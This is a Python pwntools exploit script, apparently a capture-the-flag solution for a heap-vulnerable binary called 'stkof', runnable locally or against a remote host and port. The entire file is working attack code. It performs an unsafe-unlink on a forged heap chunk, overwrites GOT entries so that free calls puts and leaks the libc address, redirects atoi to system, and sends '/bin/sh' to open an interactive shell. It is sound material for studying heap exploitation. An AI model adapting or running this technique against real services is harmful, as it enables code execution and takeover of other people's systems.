#!/usr/bin/env python3

from pwn import *

context(os="linux", arch="amd64", log_level="info")
localfile = "./stkof"
locallibc = "../glibc_versions/2.25/x64_notcache/lib/libc-2.25.so"

def my_malloc(size):
    io.sendline(str(1))
    io.sendline(str(size))
    io.recvuntil("OK\n")

def my_read(idx, payload):
    io.sendline(str(2))
    io.sendline(str(idx))
    io.sendline(str(len(payload)))
    io.send(payload)
    io.recvuntil("OK\n")

def my_free(idx):
    io.sendline(str(3))
    io.sendline(str(idx))
    io.recvuntil("OK\n")

def exp():
    my_malloc(0x80)
    my_malloc(0x80)
    my_malloc(0x80)

    # unsafe unlink
    global2 = 0x602150
    fake_chunk = p64(0) + p64(0x81) + p64(global2-0x18) + p64(global2-0x10)
    fake_chunk = fake_chunk.ljust(0x80, b"\x00")
    fake_chunk += p64(0x80) + p64(0x90)
    my_read(2, fake_chunk)
    my_free(3)

    # write puts_plt to free_got
    free_got = elf.got["free"]
    puts_plt = elf.plt["puts"]
    atoi_got = elf.got["atoi"]
    payload = p64(0)*2 + p64(free_got) + p64(atoi_got) + p64(atoi_got)
    my_read(2, payload)
    my_read(1, p64(puts_plt))
    
    # equivalent: my_free(2)
    # leak libc
    io.sendline(str(3))
    io.sendline(str(2))
    atoi_addr = u64(io.recv(6).ljust(8, b"\x00"))
    libc_base = atoi_addr - libc.sym["atoi"]
    log.debug("libc_base: 0x%x" % libc_base)

    system_addr = libc_base + libc.sym["system"]
    my_read(3, p64(system_addr))
    io.sendline("/bin/sh\x00")

    io.interactive()




argc = len(sys.argv)
if argc == 1:
    io = process(localfile)
else:
    if argc == 2:
        host, port = sys.argv[1].split(":")
    elif argc == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    io = remote(host, port)
elf = ELF(localfile)
libc = ELF(locallibc)
exp()
